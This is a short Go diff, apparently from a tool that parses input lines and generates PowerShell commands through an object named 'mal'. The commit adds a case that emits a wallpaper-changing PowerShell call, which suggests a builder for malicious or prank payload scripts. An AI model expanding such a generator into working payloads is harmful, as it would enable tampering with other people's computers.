@@ -16,12 +16,12 @@ const (
 func Parse(new_line string) {
 	regex := regexp.MustCompile(EXTRACT_FUNCTION_VALUE)
 	result := regex.FindAllStringSubmatch(new_line, -1)
-	//var value string
-	//if len(result) > 0 {
-	//	value = result[0][1]
-	//} else {
-	//	value = "NULL"
-	//}
+	var value string
+	if len(result) > 0 {
+		value = result[0][1]
+	} else {
+		value = "NULL"
+	}
 	regex = regexp.MustCompile(EXTRACT_SUBDOMAIN)
 	result = regex.FindAllStringSubmatch(new_line, -1)
 
@@ -37,6 +37,14 @@ func Parse(new_line string) {
 			default:
 				function_error(function)
 			}
+		case "change":
+			switch function {
+			case "wallpaper":
+				mal.AddContent("pwsh.Change_wallpaper(\"" + value + "\")")
+			default:
+				function_error(function)
+			}
+
 		default:
 			subdomain_error(subdomain)
 		}
